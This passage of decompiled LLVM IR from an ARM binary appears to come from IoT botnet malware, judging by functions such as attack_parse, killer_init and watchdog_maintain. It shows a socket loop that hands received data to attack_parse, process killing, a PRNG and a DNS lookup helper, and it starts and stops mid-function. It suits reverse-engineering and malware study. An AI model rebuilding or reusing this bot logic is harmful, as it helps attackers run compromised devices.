  %v1_e1f0 = inttoptr i32 %v0_e1f0 to i32*
  %v2_e1f0 = load i32, i32* %v1_e1f0, align 4
  store i32 %v2_e1f0, i32* %r3.global-to-local, align 4
  %v7_e1f4 = icmp eq i32 %v2_e1f0, 4
  br i1 %v7_e1f4, label %dec_label_pc_ddb0, label %bb44

bb44:                                             ; preds = %dec_label_pc_e1f0
  %v8_e1f8 = icmp eq i32 %v2_e1f0, 11
  br i1 %v8_e1f8, label %dec_label_pc_ddb0, label %dec_label_pc_e200

dec_label_pc_e200:                                ; preds = %dec_label_pc_e284, %bb44, %dec_label_pc_e018
  %v2_e200 = load i32, i32* @global_var_222f0.107, align 4
  store i32 57868, i32* @lr, align 4
  %v1_e208 = icmp ne i32 %v2_e200, -1
  call void @__pseudo_cond_branch(i1 %v1_e208, i32 ptrtoint (i32* @global_var_14aa0.112 to i32))
  store i32 ptrtoint (i32* @global_var_222f0.107 to i32), i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @global_var_222f0.107, align 4
  %v1_e21c = call i32 @sleep(i32 1)
  br label %dec_label_pc_ddb0

dec_label_pc_e224:                                ; preds = %dec_label_pc_e144
  %v2_e228 = call i32 @kill(i32 %v2_e178, i32 9)
  br label %dec_label_pc_e184

dec_label_pc_e230:                                ; preds = %dec_label_pc_e020
  %v3_e230 = udiv i32 %v4_e024, 256
  %v1_e234 = urem i32 %v4_e024, 256
  store i32 %v1_e234, i32* %r3.global-to-local, align 4
  %v4_e238 = mul nuw nsw i32 %v1_e234, 256
  %v5_e238 = or i32 %v4_e238, %v3_e230
  %v6_e238 = trunc i32 %v5_e238 to i16
  store i32 %v5_e238, i32* %r2.global-to-local, align 4
  store i32 %v2_dedc, i32* @lr, align 4
  %v7_e244 = inttoptr i32 %v5_e238 to i8*
  store i8* %v7_e244, i8** %stack_var_-42, align 4
  %tmp45 = icmp ult i16 %v6_e238, 1025
  br i1 %tmp45, label %dec_label_pc_e260, label %dec_label_pc_e24c

dec_label_pc_e24c:                                ; preds = %dec_label_pc_e230
  %v2_e24c = load i32, i32* @global_var_222f0.107, align 4
  %v1_e250 = call i32 @__GI___libc_close(i32 %v2_e24c)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_e258 = load i32, i32* @r8, align 4
  %v2_e258 = inttoptr i32 %v1_e258 to i32*
  store i32 -1, i32* %v2_e258, align 4
  br label %dec_label_pc_ddb0

dec_label_pc_e260:                                ; preds = %dec_label_pc_e230
  %v0_e260 = load i32, i32* @r4, align 4
  %v1_e260 = load i32, i32* @r5, align 4
  %v2_e260 = inttoptr i32 %v1_e260 to i32*
  store i32 %v0_e260, i32* %v2_e260, align 4
  store i32 %v2_e268, i32* @r4, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_e270 = load i32, i32* @global_var_222f0.107, align 4
  %v7_e278 = call i32 @__libc_recv(i32 %v2_e270, i32 %v2_e268, i32 %v5_e238, i32 16386)
  %v7_e27c = icmp eq i32 %v7_e278, -1
  br i1 %v7_e27c, label %dec_label_pc_e1f0, label %dec_label_pc_e284

dec_label_pc_e284:                                ; preds = %dec_label_pc_e260
  %v2_e284 = icmp eq i32 %v7_e278, 0
  br i1 %v2_e284, label %dec_label_pc_e200, label %dec_label_pc_e28c

dec_label_pc_e28c:                                ; preds = %dec_label_pc_e284
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v2_e298 = load i32, i32* @global_var_222f0.107, align 4
  %v4_e29c = call i32 @__libc_recv(i32 %v2_e298, i32 %v2_e0c0, i32 2, i32 16384)
  %v3_e2a4 = load i8*, i8** %stack_var_-42, align 4
  %v4_e2a4 = ptrtoint i8* %v3_e2a4 to i32
  %v3_e2a8 = udiv i32 %v4_e2a4, 256
  %v1_e2ac = mul i32 %v4_e2a4, 256
  %v4_e2b0 = and i32 %v1_e2ac, 65280
  %v5_e2b0 = or i32 %v4_e2b0, %v3_e2a8
  store i32 %v5_e2b0, i32* %ip.global-to-local, align 4
  store i32 %v2_dedc, i32* @lr, align 4
  store i32 %v5_e2b0, i32* %r2.global-to-local, align 4
  %v2_e2c0 = load i32, i32* @global_var_222f0.107, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_e2c8 = inttoptr i32 %v5_e2b0 to i8*
  store i8* %v6_e2c8, i8** %stack_var_-42, align 4
  %v6_e2cc = call i32 @__libc_recv(i32 %v2_e2c0, i32 %v2_e268, i32 %v5_e2b0, i32 16384)
  store i32 %v2_dedc, i32* %r2.global-to-local, align 4
  %v3_e2d4 = load i8*, i8** %stack_var_-42, align 4
  %v3_e2d8 = icmp eq i8* %v3_e2d4, null
  br i1 %v3_e2d8, label %dec_label_pc_ddb0, label %dec_label_pc_e2e0

dec_label_pc_e2e0:                                ; preds = %dec_label_pc_e28c
  %v4_e2d4 = ptrtoint i8* %v3_e2d4 to i32
  %v5_e2e4 = call i32 @attack_parse(i32* nonnull %stack_var_-1432, i32 %v4_e2d4, i32 %v2_dedc)
  br label %dec_label_pc_ddb0

; uselistorder directives
  uselistorder i8* %v3_e2d4, { 1, 0 }
  uselistorder i32 %v5_e2b0, { 1, 0, 2, 3 }
  uselistorder i32 %v7_e278, { 1, 0 }
  uselistorder i32 %v5_e238, { 1, 0, 3, 2 }
  uselistorder i32 %v3_e054, { 1, 3, 2, 0 }
  uselistorder i32 %v4_e024, { 1, 0, 2, 3 }
  uselistorder i32 %v4_e00c, { 1, 0 }
  uselistorder i32 %v2_dfb0, { 6, 3, 2, 0, 1, 5, 4 }
  uselistorder i32 %v2_def0, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-1436.1, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_ded8, { 1, 0, 2 }
  uselistorder i32 %v5_dea4, { 1, 2, 0 }
  uselistorder i32 %v2_ddf0, { 2, 1, 0 }
  uselistorder i32 %v1_dde0, { 1, 2, 0 }
  uselistorder i32 %v1_ddc4, { 1, 2, 0 }
  uselistorder i32 %stack_var_-1436.0, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v2_e0dc, { 1, 0, 2, 3 }
  uselistorder i32 %v2_e0c0, { 3, 0, 5, 4, 2, 1 }
  uselistorder i32 %v2_e0b8, { 1, 0 }
  uselistorder i32 %v2_dedc, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v2_ddac, { 1, 0, 2 }
  uselistorder i32 %v2_dc50, { 0, 12, 1, 13, 2, 11, 3, 10, 4, 5, 9, 8, 6, 14, 7, 15 }
  uselistorder i32 %v2_dc3c, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_dbb8, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0, 2 }
  uselistorder i32* %stack_var_-152, { 1, 0, 2 }
  uselistorder i32* %stack_var_-48, { 1, 0, 2 }
  uselistorder i8** %stack_var_-42, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 26, 27, 28, 30, 29, 33, 31, 32, 24, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 7, 8, 9, 5, 6, 10, 11 }
  uselistorder i32* @global_var_2246c.97, { 1, 2, 0 }
  uselistorder i8* null, { 0, 2, 1 }
  uselistorder i32 16386, { 1, 2, 0, 3 }
  uselistorder i32 ptrtoint (i8** @global_var_22470.110 to i32), { 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_22470.110 to i8*), { 0, 1, 3, 2 }
  uselistorder i32* @global_var_222ec.88, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9 }
  uselistorder i32* @global_var_222f0.107, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32 (i32)* @watchdog_maintain, { 1, 0 }
  uselistorder i32 (i32)* @killer_init, { 1, 0 }
  uselistorder i32 (i32)* @attack_init, { 1, 0 }
  uselistorder i32 (i32, i32)* @rand_alpha_str, { 2, 1, 0 }
  uselistorder i32* @global_var_222f4.86, { 2, 0, 3, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_d9e4.84 to i32), { 0, 2, 1 }
  uselistorder i32 ptrtoint (i16** @global_var_24f8c.93 to i32), { 0, 1, 3, 2 }
  uselistorder i32 (i32, i32)* @bsd_signal, { 1, 0 }
  uselistorder label %dec_label_pc_e18c, { 1, 0 }
  uselistorder label %dec_label_pc_e184, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_deec, { 2, 1, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %dec_label_pc_de30, { 2, 0, 1 }
  uselistorder label %dec_label_pc_de20, { 1, 0 }
  uselistorder label %dec_label_pc_ddb0, { 7, 1, 8, 9, 2, 0, 10, 3, 11, 12, 4, 5, 13, 6, 14 }
  uselistorder label %dec_label_pc_dc10, { 2, 0, 1 }
}

define i32 @function_e314(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_e314:
  %v0_e314 = load i1, i1* @cpsr_c, align 1
  call void @__pseudo_cond_branch(i1 %v0_e314, i32 -22311480)
  %v0_e31c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_e31c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_e314
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_e314, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @rand_next() local_unnamed_addr {
entry:
  %v2_e330 = load i32, i32* @global_var_22474.119, align 4
  %v2_e334 = load i32, i32* @global_var_22480.121, align 4
  %v4_e340 = mul i32 %v2_e330, 2048
  %v5_e340 = xor i32 %v4_e340, %v2_e330
  store i32 %v5_e340, i32* @r3, align 4
  %v4_e344 = udiv i32 %v2_e334, 524288
  %v5_e344 = xor i32 %v4_e344, %v2_e334
  %v2_e348 = load i32, i32* @global_var_22478.123, align 4
  %v2_e34c = load i32, i32* @global_var_2247c.125, align 4
  %v2_e350 = xor i32 %v5_e344, %v5_e340
  %v4_e354 = udiv i32 %v5_e340, 256
  %v5_e354 = xor i32 %v2_e350, %v4_e354
  store i32 %v2_e348, i32* @global_var_22474.119, align 4
  store i32 %v2_e34c, i32* @global_var_22478.123, align 4
  store i32 %v2_e334, i32* @global_var_2247c.125, align 4
  store i32 %v5_e354, i32* @global_var_22480.121, align 4
  ret i32 %v5_e354

; uselistorder directives
  uselistorder i32 %v2_e334, { 2, 1, 0 }
  uselistorder i32 %v2_e330, { 1, 0 }
}

define i32 @rand_init(i32 %arg1) local_unnamed_addr {
entry:
  %v2_e38c = call i32 @__GI_time(i32* null)
  store i32 %v2_e38c, i32* @global_var_22474.119, align 4
  %v1_e398 = call i32 @__getpid(i32 %v2_e38c)
  store i32 %v1_e398, i32* @r0, align 4
  %v0_e3a0 = call i32 @getppid()
  %v2_e3a8 = xor i32 %v1_e398, %v0_e3a0
  store i32 %v2_e3a8, i32* @global_var_22478.123, align 4
  %v1_e3b0 = call i32 @clock(i32 %v2_e3a8)
  %v2_e3b4 = load i32, i32* @global_var_22478.123, align 4
  %v2_e3c0 = xor i32 %v2_e3b4, %v1_e3b0
  store i32 %v2_e3c0, i32* @global_var_22480.121, align 4
  store i32 %v1_e3b0, i32* @global_var_2247c.125, align 4
  ret i32 %v1_e3b0

; uselistorder directives
  uselistorder i32 %v1_e3b0, { 1, 2, 0 }
  uselistorder i32 ()* @getppid, { 2, 1, 0 }
  uselistorder i32 (i32)* @__getpid, { 2, 1, 0 }
}

define i32 @rand_alpha_str(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_e3e8 = load i32, i32* @r4, align 4
  %v6_e3e8 = load i32, i32* @r5, align 4
  %v9_e3e8 = load i32, i32* @r6, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  %v1_e3fc = call i32 @table_unlock_val(i32 33)
  %v3_e408 = call i32 @table_retrieve_val(i32 33, i32* null)
  store i32 %v3_e408, i32* @r1, align 4
  %v2_e414 = bitcast i32* %stack_var_-72 to i8*
  %v3_e414 = call i32 @strcpy(i8* %v2_e414, i32 %v3_e408)
  %v2_e418 = icmp eq i32 %arg2, 0
  br i1 %v2_e418, label %dec_label_pc_e494, label %dec_label_pc_e420

dec_label_pc_e420:                                ; preds = %entry
  store i32 ptrtoint (i32* @global_var_22474.119 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22478.123 to i32), i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2247c.125 to i32), i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22480.121 to i32), i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v2_e478 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_e434

dec_label_pc_e434:                                ; preds = %dec_label_pc_e434.dec_label_pc_e434_crit_edge, %dec_label_pc_e420
  %v1_e458 = phi i32 [ %v1_e458.pre, %dec_label_pc_e434.dec_label_pc_e434_crit_edge ], [ ptrtoint (i32* @global_var_22474.119 to i32), %dec_label_pc_e420 ]
  %v2_e434 = load i32, i32* @global_var_22480.121, align 4
  store i32 %v2_e434, i32* %r2.global-to-local, align 4
  %v2_e438 = load i32, i32* @global_var_22474.119, align 4
  %v4_e43c = udiv i32 %v2_e434, 524288
  %v5_e43c = xor i32 %v4_e43c, %v2_e434
  %v4_e440 = mul i32 %v2_e438, 2048
  %v5_e440 = xor i32 %v4_e440, %v2_e438
  %v2_e444 = xor i32 %v5_e43c, %v5_e440
  %v2_e448 = load i32, i32* @global_var_22478.123, align 4
  %v2_e44c = load i32, i32* @global_var_2247c.125, align 4
  store i32 %v2_e44c, i32* %ip.global-to-local, align 4
  %v4_e450 = udiv i32 %v5_e440, 256
  %v5_e450 = xor i32 %v2_e444, %v4_e450
  store i32 %v5_e450, i32* @r4, align 4
  %v2_e458 = inttoptr i32 %v1_e458 to i32*
  store i32 %v2_e448, i32* %v2_e458, align 4
  %v0_e45c = load i32, i32* %ip.global-to-local, align 4
  %v1_e45c = load i32, i32* %r8.global-to-local, align 4
  %v2_e45c = inttoptr i32 %v1_e45c to i32*
  store i32 %v0_e45c, i32* %v2_e45c, align 4
  %v0_e460 = load i32, i32* %r2.global-to-local, align 4
  %v1_e460 = load i32, i32* %r7.global-to-local, align 4
  %v2_e460 = inttoptr i32 %v1_e460 to i32*
  store i32 %v0_e460, i32* %v2_e460, align 4
  %v0_e464 = load i32, i32* @r4, align 4
  %v1_e464 = load i32, i32* @r6, align 4
  %v2_e464 = inttoptr i32 %v1_e464 to i32*
  store i32 %v0_e464, i32* %v2_e464, align 4
  %v2_e468 = call i32 @util_strlen(i8* %v2_e414)
  %v0_e470 = load i32, i32* @r4, align 4
  %v3_e474 = urem i32 %v0_e470, %v2_e468
  %v2_e47c = add i32 %v3_e474, %v2_e478
  %v1_e480 = add i32 %v2_e47c, -32
  %v2_e480 = inttoptr i32 %v1_e480 to i8*
  %v3_e480 = load i8, i8* %v2_e480, align 1
  %v2_e484 = load i32, i32* @r5, align 4
  %v3_e484 = load i32, i32* %fp.global-to-local, align 4
  %v4_e484 = add i32 %v3_e484, %v2_e484
  %v5_e484 = inttoptr i32 %v4_e484 to i8*
  store i8 %v3_e480, i8* %v5_e484, align 1
  %v0_e488 = load i32, i32* @r5, align 4
  %v1_e488 = add i32 %v0_e488, 1
  store i32 %v1_e488, i32* @r5, align 4
  %v1_e48c = load i32, i32* %sb.global-to-local, align 4
  %v9_e48c = icmp eq i32 %v1_e488, %v1_e48c
  br i1 %v9_e48c, label %dec_label_pc_e494, label %dec_label_pc_e434.dec_label_pc_e434_crit_edge

dec_label_pc_e434.dec_label_pc_e434_crit_edge:    ; preds = %dec_label_pc_e434
  %v1_e458.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_e434

dec_label_pc_e494:                                ; preds = %dec_label_pc_e434, %entry
  %v1_e498 = call i32 @table_lock_val(i32 33)
  store i32 %v3_e3e8, i32* @r4, align 4
  store i32 %v6_e3e8, i32* @r5, align 4
  store i32 %v9_e3e8, i32* @r6, align 4
  ret i32 %v1_e498

; uselistorder directives
  uselistorder i32 %v2_e438, { 1, 0 }
  uselistorder i32 %v2_e434, { 1, 0, 2 }
}

define i32 @rand_str(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_e4b8 = load i32, i32* %r1.global-to-local, align 4
  %v3_e4bc = load i32, i32* @r4, align 4
  store i32 %v3_e4bc, i32* %stack_var_-28, align 4
  %v0_e4c0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_e4c0, i32* %r5.global-to-local, align 4
  %tmp16 = icmp slt i32 %v0_e4b8, 1
  br i1 %tmp16, label %dec_label_pc_e568, label %dec_label_pc_e4c8

dec_label_pc_e4c8:                                ; preds = %entry
  store i32 ptrtoint (i32* @global_var_22480.121 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2247c.125 to i32), i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22478.123 to i32), i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22474.119 to i32), i32* %r6.global-to-local, align 4
  %v2_e4d8 = load i32, i32* @global_var_22480.121, align 4
  store i32 %v2_e4d8, i32* %lr.global-to-local, align 4
  %v2_e4dc = load i32, i32* @global_var_2247c.125, align 4
  store i32 %v2_e4dc, i32* %r4.global-to-local, align 4
  %v2_e4e0 = load i32, i32* @global_var_22478.123, align 4
  store i32 %v2_e4e0, i32* %r0.global-to-local, align 4
  %v2_e4e4 = load i32, i32* @global_var_22474.119, align 4
  br label %dec_label_pc_e508

dec_label_pc_e4ec:                                ; preds = %dec_label_pc_e528
  %v1_e4ec = trunc i32 %v5_e518 to i16
  %v3_e4ec = inttoptr i32 %v9_e51c to i16*
  store i16 %v1_e4ec, i16* %v3_e4ec, align 2
  %v4_e4ec = load i32, i32* %r5.global-to-local, align 4
  %v5_e4ec = add i32 %v4_e4ec, -2
  store i32 %v5_e4ec, i32* %r5.global-to-local, align 4
  %v0_e4f0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e4f0

dec_label_pc_e4f0:                                ; preds = %.thread, %dec_label_pc_e4ec
  %v0_e4f0 = phi i32 [ %v9_e520, %.thread ], [ %v0_e4f0.pre, %dec_label_pc_e4ec ]
  %v2_e4ec5 = phi i32 [ %v12_e51c, %.thread ], [ %v5_e4ec, %dec_label_pc_e4ec ]
  %tmp17 = icmp slt i32 %v0_e4f0, 1
  br i1 %tmp17, label %dec_label_pc_e570, label %dec_label_pc_e4fc

dec_label_pc_e4fc:                                ; preds = %dec_label_pc_e4f0
  %v0_e4f4 = load i32, i32* %r0.global-to-local, align 4
  %v0_e4fc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_e4fc, i32* %r0.global-to-local, align 4
  %v0_e500 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v0_e500, i32* %r4.global-to-local, align 4
  %v0_e504 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_e504, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_e508

dec_label_pc_e508:                                ; preds = %dec_label_pc_e4c8, %dec_label_pc_e4fc
  %v0_e554 = phi i32 [ %v2_e4e0, %dec_label_pc_e4c8 ], [ %v0_e4fc, %dec_label_pc_e4fc ]
  %v9_e51c = phi i32 [ %v0_e4c0, %dec_label_pc_e4c8 ], [ %v2_e4ec5, %dec_label_pc_e4fc ]
  %v0_e534 = phi i32 [ %v0_e4b8, %dec_label_pc_e4c8 ], [ %v0_e4f0, %dec_label_pc_e4fc ]
  %v0_e548 = phi i32 [ %v2_e4d8, %dec_label_pc_e4c8 ], [ %v0_e504, %dec_label_pc_e4fc ]
  %v0_e544 = phi i32 [ %v2_e4e4, %dec_label_pc_e4c8 ], [ %v0_e4f4, %dec_label_pc_e4fc ]
  %v4_e508 = mul i32 %v0_e544, 2048
  %v5_e508 = xor i32 %v4_e508, %v0_e544
  %v4_e50c = udiv i32 %v0_e548, 524288
  %v5_e50c = xor i32 %v4_e50c, %v0_e548
  %v2_e510 = xor i32 %v5_e50c, %v5_e508
  %v4_e518 = udiv i32 %v5_e508, 256
  %v5_e518 = xor i32 %v2_e510, %v4_e518
  store i32 %v5_e518, i32* %r3.global-to-local, align 4
  %v7_e51c = icmp sgt i32 %v0_e534, 3
  br i1 %v7_e51c, label %.thread, label %dec_label_pc_e528

.thread:                                          ; preds = %dec_label_pc_e508
  %v10_e51c = inttoptr i32 %v9_e51c to i32*
  store i32 %v5_e518, i32* %v10_e51c, align 4
  %v11_e51c = load i32, i32* %r5.global-to-local, align 4
  %v12_e51c = add i32 %v11_e51c, 4
  store i32 %v12_e51c, i32* %r5.global-to-local, align 4
  %v8_e520 = load i32, i32* %r1.global-to-local, align 4
  %v9_e520 = add i32 %v8_e520, -4
  store i32 %v9_e520, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e4f0

dec_label_pc_e528:                                ; preds = %dec_label_pc_e508
  %v7_e534 = icmp eq i32 %v0_e534, 1
  store i32 %v5_e518, i32* %r3.global-to-local, align 4
  %v1_e53c = add i32 %v0_e534, -2
  store i32 %v1_e53c, i32* %r1.global-to-local, align 4
  br i1 %v7_e534, label %dec_label_pc_e544, label %dec_label_pc_e4ec

dec_label_pc_e544:                                ; preds = %dec_label_pc_e528
  store i32 %v5_e518, i32* %r3.global-to-local, align 4
  %v1_e554 = load i32, i32* %r6.global-to-local, align 4
  %v2_e554 = inttoptr i32 %v1_e554 to i32*
  store i32 %v0_e554, i32* %v2_e554, align 4
  %v0_e558 = load i32, i32* %r4.global-to-local, align 4
  %v1_e558 = load i32, i32* %r7.global-to-local, align 4
  %v2_e558 = inttoptr i32 %v1_e558 to i32*
  store i32 %v0_e558, i32* %v2_e558, align 4
  %v0_e55c = load i32, i32* %lr.global-to-local, align 4
  %v1_e55c = load i32, i32* %r8.global-to-local, align 4
  %v2_e55c = inttoptr i32 %v1_e55c to i32*
  store i32 %v0_e55c, i32* %v2_e55c, align 4
  %v0_e560 = load i32, i32* %r3.global-to-local, align 4
  %v1_e560 = load i32, i32* %sl.global-to-local, align 4
  %v2_e560 = inttoptr i32 %v1_e560 to i32*
  store i32 %v0_e560, i32* %v2_e560, align 4
  %v0_e564 = load i32, i32* %r3.global-to-local, align 4
  %v1_e564 = trunc i32 %v0_e564 to i8
  %v2_e564 = load i32, i32* %r5.global-to-local, align 4
  %v3_e564 = inttoptr i32 %v2_e564 to i8*
  store i8 %v1_e564, i8* %v3_e564, align 1
  br label %dec_label_pc_e568

dec_label_pc_e568:                                ; preds = %entry, %dec_label_pc_e570, %dec_label_pc_e544
  %v2_e568 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_e568, i32* @r4, align 4
  %v1_e56c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_e56c

dec_label_pc_e570:                                ; preds = %dec_label_pc_e4f0
  %v0_e570 = load i32, i32* %r3.global-to-local, align 4
  %v1_e570 = load i32, i32* %sl.global-to-local, align 4
  %v2_e570 = inttoptr i32 %v1_e570 to i32*
  store i32 %v0_e570, i32* %v2_e570, align 4
  %v0_e574 = load i32, i32* %lr.global-to-local, align 4
  %v1_e574 = load i32, i32* %r8.global-to-local, align 4
  %v2_e574 = inttoptr i32 %v1_e574 to i32*
  store i32 %v0_e574, i32* %v2_e574, align 4
  %v0_e578 = load i32, i32* %r4.global-to-local, align 4
  %v1_e578 = load i32, i32* %r7.global-to-local, align 4
  %v2_e578 = inttoptr i32 %v1_e578 to i32*
  store i32 %v0_e578, i32* %v2_e578, align 4
  %v0_e57c = load i32, i32* %r0.global-to-local, align 4
  %v1_e57c = load i32, i32* %r6.global-to-local, align 4
  %v2_e57c = inttoptr i32 %v1_e57c to i32*
  store i32 %v0_e57c, i32* %v2_e57c, align 4
  br label %dec_label_pc_e568

; uselistorder directives
  uselistorder i32 %v9_e520, { 1, 0 }
  uselistorder i32 %v12_e51c, { 1, 0 }
  uselistorder i32 %v5_e518, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v0_e544, { 1, 0 }
  uselistorder i32 %v0_e548, { 1, 0 }
  uselistorder i32 %v0_e534, { 1, 0, 2 }
  uselistorder i32 %v0_e4f0, { 1, 0 }
  uselistorder i32 %v0_e4b8, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 4, 0, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 4, 0, 1, 2, 3, 6, 5 }
  uselistorder i32* %r1.global-to-local, { 3, 5, 4, 2, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 2, 5, 6, 0, 1 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* @global_var_22474.119, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_22474.119 to i32), { 1, 0, 2 }
  uselistorder i32* @global_var_22478.123, { 2, 3, 6, 4, 1, 0, 5 }
  uselistorder i32* @global_var_2247c.125, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32* @global_var_22480.121, { 2, 3, 5, 1, 0, 4 }
  uselistorder label %dec_label_pc_e568, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e508, { 1, 0 }
}

define i32 @resolv_entries_free(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_e594 = load i32, i32* @r4, align 4
  store i32 %v3_e594, i32* %stack_var_-8, align 4
  %v6_e594 = load i32, i32* @lr, align 4
  %v0_e598 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_e598, i32* @r4, align 4
  %v2_e598 = icmp eq i32 %v0_e598, 0
  br i1 %v2_e598, label %dec_label_pc_e5b4, label %dec_label_pc_e5a0

dec_label_pc_e5a0:                                ; preds = %entry
  %v1_e5a0 = add i32 %v0_e598, 4
  %v2_e5a0 = inttoptr i32 %v1_e5a0 to i32*
  %v3_e5a0 = load i32, i32* %v2_e5a0, align 4
  store i32 %v3_e5a0, i32* %r0.global-to-local, align 4
  store i32 58796, i32* @lr, align 4
  %v1_e5a8 = icmp ne i32 %v3_e5a0, 0
  call void @__pseudo_cond_branch(i1 %v1_e5a8, i32 ptrtoint (i32* @global_var_135cc.33 to i32))
  %v0_e5ac = load i32, i32* @r4, align 4
  store i32 %v0_e5ac, i32* @r0, align 4
  %v0_e5b0 = call i32 @free()
  store i32 %v0_e5b0, i32* %r0.global-to-local, align 4
  %v2_e5b4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_e5b4

dec_label_pc_e5b4:                                ; preds = %entry, %dec_label_pc_e5a0
  %v1_e5b8 = phi i32 [ 0, %entry ], [ %v0_e5b0, %dec_label_pc_e5a0 ]
  %v2_e5b4 = phi i32 [ %v3_e594, %entry ], [ %v2_e5b4.pre, %dec_label_pc_e5a0 ]
  store i32 %v2_e5b4, i32* @r4, align 4
  store i32 %v6_e594, i32* @lr, align 4
  ret i32 %v1_e5b8

; uselistorder directives
  uselistorder i32 %v0_e598, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_e5b4, { 1, 0 }
}

define i32 @resolv_lookup(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp79 = call i16 @__decompiler_undefined_function_3()
  %stack_var_-4280 = alloca i32, align 4
  %stack_var_-4292 = alloca i16, align 2
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-2230 = alloca i32, align 4
  %stack_var_-2244 = alloca i16, align 2
  %stack_var_-2232 = alloca i32, align 4
